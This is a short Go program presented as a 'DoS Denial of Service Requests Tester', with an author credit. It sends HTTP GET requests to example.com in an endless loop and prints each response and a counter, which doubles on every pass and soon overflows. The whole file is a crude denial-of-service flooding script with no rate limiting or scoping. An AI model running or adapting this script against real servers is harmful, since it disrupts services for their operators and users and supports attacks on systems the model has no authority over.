package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

func main() {
count := 1
	fmt.Println ("DoS Denial of Service Requests Tester")
	fmt.Println ("Mauro Risonho de Paula Assumpção aka firebits")
	fmt.Println ("mauro.risonho () gmail com")

for {
	count += count

	fmt.Println ("Connected Port...")
	fmt.Println ("Counter Loops: ", count)

	res, err := http.Get("http://www.example.com:80")
	if err != nil {
		log.Fatal(err)
	}
		robots, err := ioutil.ReadAll(res.Body)
		res.Body.Close()
		
	if err != nil {
		log.Fatal(err)
		}
	fmt.Printf("%s", robots)
	}
}
